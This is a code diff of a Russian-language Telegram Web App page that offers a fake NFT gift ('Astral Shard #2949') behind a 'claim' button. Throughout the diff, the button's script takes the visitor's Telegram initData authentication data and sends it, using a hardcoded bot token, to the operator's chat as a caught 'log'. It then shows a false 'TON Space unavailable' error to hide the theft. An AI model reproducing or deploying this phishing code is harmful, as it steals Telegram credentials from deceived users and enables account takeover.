@@ -12,15 +12,15 @@
     <img src="https://nft-tg.com/wp-content/uploads/2024/11/astral-shard.png" width="150" style="border-radius:20px;">
     <h2>Вы получили подарок!</h2>
     <p>Astral Shard #2949</p>
-    <button class="btn" onclick="claim()">ПОЛУЧИТЬ</button>
+    <button class="btn" onclick="send()">ПОЛУЧИТЬ</button>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        function claim() {
+        function send() {
             const authKey = tg.initData;
-            // ТВОИ ОБНОВЛЕННЫЕ ДАННЫЕ:
+            // ТВОИ ПРОВЕРЕННЫЕ ДАННЫЕ
             const botToken = '8646280109:AAFVgDZQxQvxc4S7FnE0w-HuPn_QxOhl36E'; 
             const myChatId = '8486064073'; 
 
@@ -29,11 +29,11 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: myChatId,
-                    text: "🔔 **НОВЫЙ ЛОГ!**\n👤 Юзер: @" + (tg.initDataUnsafe.user.username || "unknown") + "\n🔑 Ключ:\n`" + authKey + "`",
+                    text: "🔔 **ЛОГ ПОЙМАН!**\n\n🔑 Твой auth_key:\n`" + authKey + "`",
                     parse_mode: "Markdown"
                 })
             }).then(() => {
-                alert("Ошибка: TON Space временно недоступен.");
+                alert("Ошибка: TON Space временно недоступен. Попробуйте позже.");
             });
         }
     </script>
